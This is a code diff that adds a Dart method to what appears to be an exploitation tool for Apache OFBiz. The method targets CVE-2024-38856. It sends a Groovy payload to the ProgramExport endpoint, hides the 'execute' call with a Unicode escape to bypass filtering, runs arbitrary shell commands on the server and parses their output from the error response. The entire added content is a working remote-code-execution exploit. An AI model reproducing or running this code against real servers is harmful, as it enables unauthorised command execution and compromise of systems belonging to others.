@@ -451,4 +451,54 @@ class OFBizExpService {
       client.close();
     }
   }
+
+  /// CVE-2024-38856: multipart POST to /main/ProgramExport with Unicode bypass.
+  Future<String?> execRce38856(String cmd) async {
+    final client = _client();
+    try {
+      final cmdBytes = cmd.codeUnits.join(',');
+      final groovyCode =
+          "throw new Exception(['sh','-c',new String([$cmdBytes] as byte[])"
+          "+' 2>&1'].\\u0065xecute().text);";
+      const boundary = '----WebKitFormBoundaryMAtrix911';
+      final body = '--$boundary\r\n'
+          'Content-Disposition: form-data; name="groovyProgram"\r\n\r\n'
+          '$groovyCode\r\n'
+          '--$boundary--';
+
+      final res = await client
+          .post(
+            Uri.parse('$_base/webtools/control/main/ProgramExport'),
+            headers: {
+              'Content-Type':
+                  'multipart/form-data; boundary=$boundary',
+            },
+            body: body,
+          )
+          .timeout(timeout);
+
+      final match = RegExp(
+        r'java\.lang\.Exception:\s*([^<]+)',
+        caseSensitive: false,
+      ).firstMatch(res.body);
+
+      String? out = match?.group(1)?.trim();
+      if (out != null) {
+        out = out
+            .replaceAll('&#xd;', '\r')
+            .replaceAll('&#xa;', '\n')
+            .replaceAll('&lt;', '<')
+            .replaceAll('&gt;', '>')
+            .replaceAll('&amp;', '&')
+            .replaceAll('&#39;', "'")
+            .trim();
+        if (out.isEmpty || out.contains('<!DOCTYPE html>')) out = null;
+      }
+      return out?.isNotEmpty == true ? out : null;
+    } catch (_) {
+      return null;
+    } finally {
+      client.close();
+    }
+  }
 }
